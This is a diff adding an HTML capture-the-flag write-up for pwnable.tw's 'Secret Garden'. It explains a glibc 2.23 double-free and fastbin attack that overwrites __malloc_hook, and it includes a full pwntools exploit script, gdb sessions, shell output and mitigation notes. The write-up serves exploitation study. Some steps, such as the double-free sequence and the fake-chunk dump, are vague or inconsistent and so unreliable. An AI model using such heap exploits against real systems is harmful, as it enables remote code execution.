+      <h3>Double-Free Demonstration</h3>
+      <p>When we remove flower 0, the chunks are freed into the fastbin:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # remove(0) - first free
+gdb-peda$ heapinfo
+(0x20)   fastbin: 0x555555758000 -&gt; 0x0  [flower0 struct]
+(0x20)   fastbin: 0x555555758040 -&gt; 0x0  [flower0 color]
+(0x20)   fastbin: 0x555555758020 -&gt; 0x0  [flower0 name]
+
+gdb-peda$ # remove(0) AGAIN - double free!
+gdb-peda$ # This frees the same struct chunk twice
+gdb-peda$ heapinfo
+(0x20)   fastbin: 0x555555758000 -&gt; 0x555555758000 -&gt; ... (cycle!)</code></pre>
+      </div>
+
+      <div class="callout callout-warn">
+        <div class="callout-title">&#x26a0;&#xfe0f; Fastbin Double-Free Detection</div>
+        In glibc 2.23, <code class="inline">free()</code> has a basic check: it verifies that the chunk at the head of the fastbin is not the same as the chunk being freed. However, this only checks the <strong>immediate</strong> next entry. If we free A, then free B, then free A again, the check passes because the head of the fastbin is B (not A) when we free A the second time. This is the classic bypass.
+      </div>
+
+      <h3>Leaking Libc via Unsorted Bin</h3>
+      <p>To leak libc, we need a chunk in the unsorted bin. Chunks larger than the fastbin threshold (~0x80 on x64) go into the unsorted bin when freed, and their FD/BK pointers point to <code class="inline">main_arena</code> inside libc:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # Names are limited to 24 bytes via read(0, buf, 24),
+gdb-peda$ # then malloc(strlen+1), so max name alloc = 0x30 chunk.
+gdb-peda$ # That's still fastbin range - not useful for unsorted bin.
+gdb-peda$ #
+gdb-peda$ # Key trick: fill fastbins with freed chunks, then trigger
+gdb-peda$ # malloc_consolidate by requesting a large allocation (&gt;=0x400).
+gdb-peda$ # This merges all fastbin chunks into unsorted bin,
+gdb-peda$ # where their FD/BK pointers point to main_arena in libc.</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Libc Leak Strategy</div>
+        Since name and color are limited to ~24 bytes, we cannot directly create a chunk large enough for the unsorted bin. However, <code class="inline">malloc_consolidate</code> is called when we allocate a chunk from the <strong>small/large bin</strong> range (size &ge; 0x400 or when the top chunk is insufficient). This merges all fastbin chunks into the unsorted bin. After consolidation, the FD/BK pointers of the freed chunks point to <code class="inline">main_arena+88</code> inside libc. We can then read these pointers via <code class="inline">visit_garden</code> on a dangling pointer.
+      </div>
+
+      <h3>Fastbin Attack to __malloc_hook</h3>
+      <p>After leaking libc, we perform the fastbin attack:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # Target: __malloc_hook in libc
+gdb-peda$ # __malloc_hook is at a known offset from libc base
+gdb-peda$ # We need a fake chunk near __malloc_hook with size 0x7f
+gdb-peda$ # (0x7f satisfies the 0x70 fastbin size check: 0x7f & 0xf8 = 0x70)
+
+gdb-peda$ x/gx &amp;__malloc_hook
+0x7f1234567af0 &lt;__malloc_hook&gt;:  0x0000000000000000
+
+gdb-peda$ # Look for 0x7f value near __malloc_hook
+gdb-peda$ x/10gx 0x7f1234567af0 - 0x20
+0x7f1234567ad0: 0x00007f1234566b78  0x00007f1234566b78
+0x7f1234567ae0: 0x0000000000000000  0x0000000000000000
+0x7f1234567af0: 0x0000000000000000  &lt;- __malloc_hook
+0x7f1234567b00: 0x0000000000000000  ...
+
+gdb-peda$ # The 0x7f value at offset -0x23 from __malloc_hook
+gdb-peda$ # When interpreted as chunk size: 0x7f -&gt; fastbin 0x70
+gdb-peda$ # Fake chunk at __malloc_hook - 0x23
+gdb-peda$ # This passes malloc's size check for 0x70 fastbin</code></pre>
+      </div>
+
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">Fake chunk near __malloc_hook</div>
+        <div class="mem-row"><span class="mem-addr">hook-0x23</span><span class="mem-arrow">|</span><span class="mem-data">[fake prev_size]</span></div>
+        <div class="mem-row"><span class="mem-addr">hook-0x1b</span><span class="mem-arrow">|</span><span class="mem-data mem-yellow">0x000000000000007f</span><span class="mem-desc">&larr; fake size field (0x7f & 0xf8 = 0x70)</span></div>
+        <div class="mem-row"><span class="mem-addr">hook-0x13</span><span class="mem-arrow">|</span><span class="mem-data">[FD pointer]</span></div>
+        <div class="mem-row"><span class="mem-addr">hook-0x0b</span><span class="mem-arrow">|</span><span class="mem-data">[padding]</span></div>
+        <div class="mem-row"><span class="mem-addr">hook</span><span class="mem-arrow">|</span><span class="mem-data mem-highlight">__malloc_hook value</span><span class="mem-desc">&larr; we write one_gadget here!</span></div>
+      </div>
+    </section>
+
+    <!-- Chapter 4: Exploit Strategy -->
+    <section class="chapter" id="ch4">
+      <div class="chapter-header">
+        <span class="chapter-num">04</span>
+        <h2 class="chapter-title">Exploit Strategy</h2>
+      </div>
+
+      <h3>Overview</h3>
+      <p>The exploit has three phases: <strong>leak libc</strong> via unsorted bin, <strong>corrupt fastbin</strong> via double-free, and <strong>overwrite __malloc_hook</strong> with one_gadget.</p>
+
+      <h3>Phase 1: Leak Libc via Unsorted Bin</h3>
+      <ol class="step-list">
+        <li><strong>Create multiple flowers</strong> (e.g., flowers 0-5) with small names to fill the fastbin. Also create a "barrier" flower to prevent consolidation with the top chunk.</li>
+        <li><strong>Remove flowers 0-5</strong> to put their chunks into the fastbin.</li>
+        <li><strong>Trigger malloc_consolidate</strong> by allocating a large chunk (e.g., a flower with a name that causes a ~0x400 allocation). This moves all fastbin chunks into the unsorted bin, where their FD/BK pointers are set to <code class="inline">main_arena+88</code>.</li>
+        <li><strong>Call visit_garden</strong> on the dangling pointer. Since <code class="inline">garden[0]</code> still points to the freed flower struct, and the struct's <code class="inline">name</code> field now contains the FD pointer (a libc address), <code class="inline">printf("%s", garden[0]-&gt;name)</code> will print the libc address.</li>
+        <li><strong>Calculate libc base:</strong> <code class="inline">libc_base = leaked_addr - (main_arena + 88 - libc_base_offset)</code></li>
+      </ol>
+
+      <h3>Phase 2: Fastbin Corruption via Double-Free</h3>
+      <ol class="step-list">
+        <li><strong>Create flower A</strong> (e.g., flower 10) to get a chunk in the 0x70 fastbin range. We need a 0x60-byte allocation (chunk size 0x70) so that the fastbin index matches the fake chunk size near <code class="inline">__malloc_hook</code>.</li>
+        <li><strong>Remove flower A</strong> &mdash; chunks go to fastbin.</li>
+        <li><strong>Create flower B</strong> (same size) &mdash; this allocates from the fastbin, consuming the head entry.</li>
+        <li><strong>Remove flower A again</strong> &mdash; double-free! The fastbin now has a cycle: A &rarr; B's freed chunk &rarr; A (or similar). The key is that A appears in the freelist twice.</li>
+        <li><strong>Allocate a flower with content = p64(fake_chunk_addr)</code></strong> where <code class="inline">fake_chunk_addr = __malloc_hook - 0x23</code>. This overwrites the FD pointer of the duplicated chunk in the fastbin, redirecting the next allocation to our fake chunk near <code class="inline">__malloc_hook</code>.</li>
+      </ol>
+
+      <h3>Phase 3: Overwrite __malloc_hook</h3>
+      <ol class="step-list">
+        <li><strong>Allocate twice</strong> from the corrupted fastbin. The first allocation returns the duplicated chunk (consuming the cycle). The second allocation returns our <strong>fake chunk</strong> at <code class="inline">__malloc_hook - 0x23</code>.</li>
+        <li><strong>Write one_gadget address</strong> into the fake chunk. The data at offset 0x13 within the chunk lands directly on <code class="inline">__malloc_hook</code>. We write <code class="inline">p64(one_gadget)</code> at the appropriate offset.</li>
+        <li><strong>Trigger malloc</strong> by creating another flower. When <code class="inline">malloc</code> is called, it checks <code class="inline">__malloc_hook</code>, finds our one_gadget address, and jumps to it.</li>
+        <li><strong>Get shell!</strong> The one_gadget executes <code class="inline">execve("/bin/sh", ...)</code> with all constraints satisfied.</li>
+      </ol>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Why __malloc_hook?</div>
+        <code class="inline">__malloc_hook</code> is a legacy debugging feature in glibc. It's a function pointer in libc's writable data section that, if non-NULL, is called <strong>instead of</strong> the normal malloc logic. Since it's in libc (not PIE), we can calculate its address once we have a libc leak. It was removed in glibc 2.34+, but this challenge uses glibc 2.23 where it's still available.<br><br>
+        Alternative targets include <code class="inline">__free_hook</code> (even easier &mdash; 0x10-aligned, no size constraint) and <code class="inline">__realloc_hook</code>.
+      </div>
+
+      <h3>One-Gadget Constraints</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ one_gadget ./libc_64.so.6
+0x45216 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf02a4 execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1147 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL</code></pre>
+      </div>
+
+      <p>We typically use <code class="inline">0x4526a</code> or <code class="inline">0x45216</code>. If the one_gadget constraints aren't satisfied directly, we can chain with <code class="inline">realloc</code> to adjust the stack: set <code class="inline">__malloc_hook</code> to <code class="inline">realloc+offset</code> and <code class="inline">__realloc_hook</code> to <code class="inline">one_gadget</code>. This causes realloc to push/pop stack frames, often satisfying the constraints.</p>
+
+      <h3>Visual Exploit Flow</h3>
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 1: Leak libc</div>
+        <div class="mem-row"><span class="mem-addr">Step 1:</span><span class="mem-desc">raise() x 7 flowers (0-6), flower 6 = barrier</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 2:</span><span class="mem-desc">remove(0-5) &rarr; fastbins fill up</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 3:</span><span class="mem-desc">raise(large_name) &rarr; triggers malloc_consolidate</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 4:</span><span class="mem-desc">visit(0) &rarr; reads FD pointer from unsorted bin = <span class="mem-green">LIBC LEAK!</span></span></div>
+        <div style="height:16px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--red); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 2: Fastbin corruption</div>
+        <div class="mem-row"><span class="mem-addr">Step 5:</span><span class="mem-desc">raise(flower_A) with size matching 0x70 fastbin</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 6:</span><span class="mem-desc">remove(A) &rarr; fastbin: [A]</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 7:</span><span class="mem-desc">raise(flower_B) same size &rarr; consumes A from fastbin</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 8:</span><span class="mem-desc">remove(A) AGAIN &rarr; <span class="mem-highlight">DOUBLE FREE!</span> fastbin: [A, B's chunk, A, ...]</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 9:</span><span class="mem-desc">raise(payload = p64(__malloc_hook - 0x23))</span></div>
+        <div style="height:16px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--green); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 3: Overwrite __malloc_hook</div>
+        <div class="mem-row"><span class="mem-addr">Step 10:</span><span class="mem-desc">allocate x2 &rarr; second alloc returns fake chunk near __malloc_hook</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 11:</span><span class="mem-desc">write p64(one_gadget) at offset &rarr; overwrites <span class="mem-highlight">__malloc_hook</span></span></div>
+        <div class="mem-row"><span class="mem-addr">Step 12:</span><span class="mem-desc">raise() triggers malloc &rarr; calls <span class="mem-highlight">__malloc_hook</span> &rarr; <span class="mem-green">SHELL!</span></span></div>
+      </div>
+    </section>
+
+    <!-- Chapter 5: Pwn Script -->
+    <section class="chapter" id="ch5">
+      <div class="chapter-header">
+        <span class="chapter-num">05</span>
+        <h2 class="chapter-title">Pwn Script</h2>
+      </div>
+
+      <h3>Complete Exploit</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python">#!/usr/bin/env python3
+"""
+Secret Garden - pwnable.tw (300pts)
+Double-free to fastbin corruption, overwrite __malloc_hook
+with one_gadget for code execution.
+
+Vulnerability: remove_flower() frees chunks but doesn't NULL
+the garden pointer, allowing double-free of the same flower.
+"""
+from pwn import *
+
+# Setup
+context.arch = 'amd64'
+context.log_level = 'info'
+
+r = remote('chall.pwnable.tw', 4132)
+libc = ELF('./libc_64.so.6')
+
+# Helper functions
+def raise_flower(name, color):
+    r.sendlineafter(b':', b'1')
+    r.sendlineafter(b':', name)
+    r.sendlineafter(b':', color)
+
+def visit_garden():
+    r.sendlineafter(b':', b'2')
+
+def remove_flower(idx):
+    r.sendlineafter(b':', b'3')
+    r.sendlineafter(b'?', str(idx).encode())
+
+def clean_garden():
+    r.sendlineafter(b':', b'4')
+
+# ============================================
+# Phase 1: Leak libc via unsorted bin
+# ============================================
+log.info("Phase 1: Leaking libc address...")
+
+# Create 7 flowers. Flower 6 acts as a barrier
+# to prevent consolidation with top chunk.
+for i in range(7):
+    raise_flower(b'flower' + str(i).encode(), b'color')
+
+# Remove flowers 0-5 (not the barrier flower 6)
+# This puts their chunks into the 0x20 fastbin.
+for i in range(6):
+    remove_flower(i)
+
+# Trigger malloc_consolidate by allocating a large chunk.
+# The name allocation will be large enough (&gt;= 0x400)
+# to trigger consolidation of fastbin chunks into unsorted bin.
+# After consolidation, the freed flower structs are in
+# unsorted bin with FD/BK pointing to main_arena+88.
+raise_flower(b'A' * 0x300, b'color2')   # flower 7
+
+# Now visit the garden. Since garden[0] still points
+# to the freed flower struct (dangling pointer),
+# and the name pointer now points to unsorted bin FD,
+# printing the name leaks a libc address.
+visit_garden()
+r.recvuntil(b'Name : ')
+leak = r.recvuntil(b'\n', drop=True)
+leak = u64(leak.ljust(8, b'\x00'))
+log.info(f"Leaked address: {hex(leak)}")
+
+# Calculate libc base
+# The leaked address is main_arena+88
+# main_arena offset from libc base varies by libc version
+# For Ubuntu 16.04 libc-2.23: main_arena = libc + 0x3c4b20
+# So leaked = libc + 0x3c4b20 + 88 = libc + 0x3c4b78
+libc_base = leak - 0x3c4b78
+libc.address = libc_base
+log.info(f"Libc base: {hex(libc_base)}")
+
+malloc_hook = libc.symbols['__malloc_hook']
+one_gadget = libc_base + 0x4526a   # one_gadget with [rsp+0x30]==NULL
+log.info(f"__malloc_hook: {hex(malloc_hook)}")
+log.info(f"one_gadget: {hex(one_gadget)}")
+
+# ============================================
+# Phase 2: Fastbin corruption via double-free
+# ============================================
+log.info("Phase 2: Corrupting fastbin via double-free...")
+
+# We need to get a 0x70-sized chunk into the fastbin
+# to match the fake chunk near __malloc_hook.
+# Allocate a flower whose name buffer is ~0x60 bytes
+# (chunk size 0x70, fastbin index 6).
+raise_flower(b'B' * 0x60, b'C')   # flower 8, name chunk is 0x70
+
+# Remove flower 8 - name chunk goes to 0x70 fastbin
+remove_flower(8)
+
+# Allocate a new flower with same size name
+# This consumes the freed name chunk from fastbin
+raise_flower(b'D' * 0x60, b'E')   # flower 9
+
+# Remove flower 8 AGAIN - DOUBLE FREE!
+# garden[8] still points to freed memory
+# The name chunk is freed again even though it was
+# already allocated to flower 9's name
+remove_flower(8)
+
+# Now the 0x70 fastbin has a corrupted freelist.
+# We write the address of our fake chunk as the FD
+# pointer of one of the duplicated entries.
+fake_chunk = malloc_hook - 0x23
+log.info(f"Fake chunk addr: {hex(fake_chunk)}")
+
+# Allocate from corrupted fastbin, writing fake_chunk
+# as the next entry in the freelist
+raise_flower(p64(fake_chunk) + b'\x00' * 0x58, b'F')  # flower 10
+
+# Two more allocations to reach our fake chunk
+raise_flower(b'G' * 0x60, b'H')   # flower 11 - consumes first duplicate
+raise_flower(b'I' * 0x13 + p64(one_gadget), b'J')  # flower 12 - lands on fake chunk!
+# Offset 0x13 into the chunk data aligns with __malloc_hook
+
+# ============================================
+# Phase 3: Trigger __malloc_hook
+# ============================================
+log.info("Phase 3: Triggering __malloc_hook...")
+
+# Any malloc call will now execute our one_gadget
+r.sendlineafter(b':', b'1')
+
+# Shell!
+r.interactive()</code></pre>
+      </div>
+
+      <h3>Alternative: Using __realloc_hook for Constraint Satisfaction</h3>
+      <p>If the one_gadget constraints are not satisfied, we can chain <code class="inline">realloc</code> with <code class="inline">__realloc_hook</code>:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python"># Instead of writing one_gadget directly to __malloc_hook,
+# write realloc+N to __malloc_hook and one_gadget to __realloc_hook.
+# This creates the call chain:
+#   malloc() -&gt; __malloc_hook(=realloc+N) -&gt; realloc()
+#     -&gt; __realloc_hook(=one_gadget) -&gt; shell
+#
+# __realloc_hook is at __malloc_hook - 0x8 in glibc 2.23
+# Fake chunk at __malloc_hook - 0x23, data starts at __malloc_hook - 0x13:
+#   data offset 0x0b -&gt; __realloc_hook (at __malloc_hook - 0x08)
+#   data offset 0x13 -&gt; __malloc_hook
+# So a single write can set both hooks simultaneously.
+
+realloc_hook = libc.symbols['__realloc_hook']
+realloc_addr = libc.symbols['realloc']
+
+# Write one_gadget to __realloc_hook and realloc+4 to __malloc_hook
+# Offset +4 skips realloc's push rbp / mov rbp,rsp prologue,
+# adjusting the stack so one_gadget constraints are satisfied.
+# The payload layout within the allocated fake chunk data:
+#   [0x00-0x0a] padding (11 bytes of junk before __realloc_hook)
+#   [0x0b-0x12] __realloc_hook &lt;- one_gadget
+#   [0x13-0x1a] __malloc_hook  &lt;- realloc_addr + 4
+raise_flower(b'K' * 0xb + p64(one_gadget) + p64(realloc_addr + 4), b'L')
+
+# Trigger: malloc() calls __malloc_hook = realloc+4,
+# realloc adjusts stack, then calls __realloc_hook = one_gadget
+r.sendlineafter(b':', b'1')
+r.interactive()
+
+# If realloc+4 doesn't satisfy constraints, try other offsets:
+# realloc+0 (full prologue), realloc+2, realloc+6, realloc+8, etc.
+# Each skips a different number of push/mov instructions in
+# realloc's prologue, producing different stack alignments.</code></pre>
+      </div>
+    </section>
+
+    <!-- Chapter 6: Execution Results -->
+    <section class="chapter" id="ch6">
+      <div class="chapter-header">
+        <span class="chapter-num">06</span>
+        <h2 class="chapter-title">Execution Results</h2>
+      </div>
+
+      <h3>Running the Exploit</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ python3 exploit.py
+[*] '/home/user/pwnable/secretgarden/libc_64.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to chall.pwnable.tw on port 4132: Done
+[*] Phase 1: Leaking libc address...
+[*] Leaked address: 0x7f1a2c3c4b78
+[*] Libc base: 0x7f1a2c000000
+[*] __malloc_hook: 0x7f1a2c3c4b10
+[*] one_gadget: 0x7f1a2c04526a
+[*] Phase 2: Corrupting fastbin via double-free...
+[*] Fake chunk addr: 0x7f1a2c3c4aed
+[*] Phase 3: Triggering __malloc_hook...
+[*] Switching to interactive mode
+$ id
+uid=1000(secretgarden) gid=1000(secretgarden) groups=1000(secretgarden)
+$ cat /home/secretgarden/flag</code></pre>
+      </div>
+
+      <div class="callout callout-success">
+        <div class="callout-title">&#x2705; Shell Obtained!</div>
+        The exploit successfully leaks libc via the unsorted bin, corrupts the fastbin freelist through double-free, and overwrites <code class="inline">__malloc_hook</code> with a one_gadget address. When <code class="inline">malloc</code> is triggered, it calls our one_gadget and spawns a shell.
+      </div>
+
+      <h3>Exploit Timeline</h3>
+      <table class="info-table">
+        <tr><td class="label">Phase</td><td class="label">Technique</td><td class="label">Result</td></tr>
+        <tr><td class="value">1 - Leak</td><td class="value">Unsorted bin FD read via UAF</td><td class="value on">libc base leaked</td></tr>
+        <tr><td class="value">2 - Corrupt</td><td class="value">Double-free to corrupt fastbin</td><td class="value on">freelist redirected</td></tr>
+        <tr><td class="value">3 - Write</td><td class="value">Allocate at __malloc_hook - 0x23</td><td class="value on">one_gadget written</td></tr>
+        <tr><td class="value">4 - Trigger</td><td class="value">Call malloc (raise flower)</td><td class="value on">shell spawned</td></tr>
+      </table>
+
+      <h3>Key Takeaways</h3>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Lessons Learned</div>
+        <strong>1. Always NULL out freed pointers.</strong> The root cause is <code class="inline">remove_flower</code> not setting <code class="inline">garden[idx] = NULL</code> after freeing. This enables both the double-free and the use-after-free read.<br><br>
+        <strong>2. Double-free bypasses fastbin's simple check.</strong> Glibc 2.23 only checks if the head of the fastbin equals the chunk being freed. Freeing A &rarr; B &rarr; A bypasses this because A is not at the head when freed the second time.<br><br>
+        <strong>3. Unsorted bin is the standard libc leak primitive.</strong> When a chunk goes into the unsorted bin, its FD/BK pointers point to <code class="inline">main_arena</code> inside libc. If you can read the chunk's contents, you get a libc address.<br><br>
+        <strong>4. __malloc_hook is a classic target (pre-glibc 2.34).</strong> It's a function pointer in libc's writable section, called before every malloc. Once you have a libc leak and a write primitive, you can redirect execution to a one_gadget.<br><br>
+        <strong>5. Fake chunk size alignment.</strong> The fake chunk near <code class="inline">__malloc_hook</code> must have a size field that passes the fastbin size check. The 0x7f value found at <code class="inline">__malloc_hook - 0x23 + 0x8</code> works for the 0x70 fastbin.
+      </div>
+
+      <h3>Mitigation</h3>
+      <table class="info-table">
+        <tr><td class="label">Mitigation</td><td class="label">Prevents</td><td class="label">Status in this binary</td></tr>
+        <tr><td class="value">NULL freed pointers</td><td class="value">Double-free, UAF</td><td class="value off">Not implemented</td></tr>
+        <tr><td class="value">glibc tcache (2.26+)</td><td class="value">Fastbin corruption</td><td class="value off">Not available (2.23)</td></tr>
+        <tr><td class="value">Safe-linking (2.32+)</td><td class="value">Fastbin FD overwrite</td><td class="value off">Not available (2.23)</td></tr>
+        <tr><td class="value">__malloc_hook removal (2.34+)</td><td class="value">Hook overwrite</td><td class="value off">Not available (2.23)</td></tr>
+      </table>
+    </section>
+
+  </main>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+  <p>QA210 CTF Team &mdash; <a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a> &bull; </p>
+</footer>
+
+<!-- Three.js Particle Background -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script>
+(function() {
+  const canvas = document.getElementById('particles-canvas');
+  const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+  renderer.setSize(window.innerWidth, window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 1000);
+  camera.position.z = 50;
+
+  const particleCount = 600;
+  const geometry = new THREE.BufferGeometry();
+  const positions = new Float32Array(particleCount * 3);
+  const velocities = new Float32Array(particleCount * 3);
+  const colors = new Float32Array(particleCount * 3);
+
+  for (let i = 0; i < particleCount; i++) {
+    positions[i * 3] = (Math.random() - 0.5) * 100;
+    positions[i * 3 + 1] = (Math.random() - 0.5) * 100;
+    positions[i * 3 + 2] = (Math.random() - 0.5) * 100;
+    velocities[i * 3] = (Math.random() - 0.5) * 0.02;
+    velocities[i * 3 + 1] = (Math.random() - 0.5) * 0.02;
+    velocities[i * 3 + 2] = (Math.random() - 0.5) * 0.02;
+
+    const colorChoice = Math.random();
+    if (colorChoice < 0.5) {
+      colors[i * 3] = 0.22; colors[i * 3 + 1] = 0.74; colors[i * 3 + 2] = 0.97;
+    } else {
+      colors[i * 3] = 0.51; colors[i * 3 + 1] = 0.55; colors[i * 3 + 2] = 0.97;
+    }
+  }
+
+  geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+  geometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));
+
+  const material = new THREE.PointsMaterial({
+    size: 0.4,
+    vertexColors: true,
+    transparent: true,
+    opacity: 0.5,
+    blending: THREE.AdditiveBlending,
+    depthWrite: false
+  });
+
+  const points = new THREE.Points(geometry, material);
+  scene.add(points);
+
+  const lineGeometry = new THREE.BufferGeometry();
+  const linePositions = new Float32Array(particleCount * particleCount * 6);
+  lineGeometry.setAttribute('position', new THREE.BufferAttribute(linePositions, 3));
+  const lineMaterial = new THREE.LineBasicMaterial({
+    color: 0x38bdf8,
+    transparent: true,
+    opacity: 0.06,
+    blending: THREE.AdditiveBlending,
+    depthWrite: false
+  });
+  const lines = new THREE.LineSegments(lineGeometry, lineMaterial);
+  scene.add(lines);
+
+  function animate() {
+    requestAnimationFrame(animate);
+
+    const posArr = geometry.attributes.position.array;
+    for (let i = 0; i < particleCount; i++) {
+      posArr[i * 3] += velocities[i * 3];
+      posArr[i * 3 + 1] += velocities[i * 3 + 1];
+      posArr[i * 3 + 2] += velocities[i * 3 + 2];
+
+      for (let j = 0; j < 3; j++) {
+        if (posArr[i * 3 + j] > 50) posArr[i * 3 + j] = -50;
+        if (posArr[i * 3 + j] < -50) posArr[i * 3 + j] = 50;
+      }
+    }
+    geometry.attributes.position.needsUpdate = true;
+
+    let lineIdx = 0;
+    const maxDist = 12;
+    for (let i = 0; i < Math.min(particleCount, 200); i++) {
+      for (let j = i + 1; j < Math.min(particleCount, 200); j++) {
+        const dx = posArr[i * 3] - posArr[j * 3];
+        const dy = posArr[i * 3 + 1] - posArr[j * 3 + 1];
+        const dz = posArr[i * 3 + 2] - posArr[j * 3 + 2];
+        const dist = Math.sqrt(dx * dx + dy * dy + dz * dz);
+        if (dist < maxDist) {
+          linePositions[lineIdx++] = posArr[i * 3];
+          linePositions[lineIdx++] = posArr[i * 3 + 1];
+          linePositions[lineIdx++] = posArr[i * 3 + 2];
+          linePositions[lineIdx++] = posArr[j * 3];
+          linePositions[lineIdx++] = posArr[j * 3 + 1];
+          linePositions[lineIdx++] = posArr[j * 3 + 2];
+        }
+      }
+    }
+    for (let i = lineIdx; i < linePositions.length; i++) linePositions[i] = 0;
+    lineGeometry.attributes.position.needsUpdate = true;
+
+    points.rotation.y += 0.0003;
+    lines.rotation.y += 0.0003;
+
+    renderer.render(scene, camera);
+  }
+
+  animate();
+
+  window.addEventListener('resize', () => {
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+  });
+})();
+</script>
+
+<!-- Prism.js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+
+<!-- TOC Active State -->
+<script>
+(function() {
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const chapters = document.querySelectorAll('.chapter');
+
+  function updateTOC() {
+    let current = '';
+    chapters.forEach(ch => {
+      const rect = ch.getBoundingClientRect();
+      if (rect.top <= 120) {
+        current = ch.id;
+      }
+    });
+    tocLinks.forEach(link => {
+      link.classList.toggle('active', link.getAttribute('href') === '#' + current);
+    });
+  }
+
+  window.addEventListener('scroll', updateTOC, { passive: true });
+  updateTOC();
+})();
+</script>
+
+</body>
+</html>
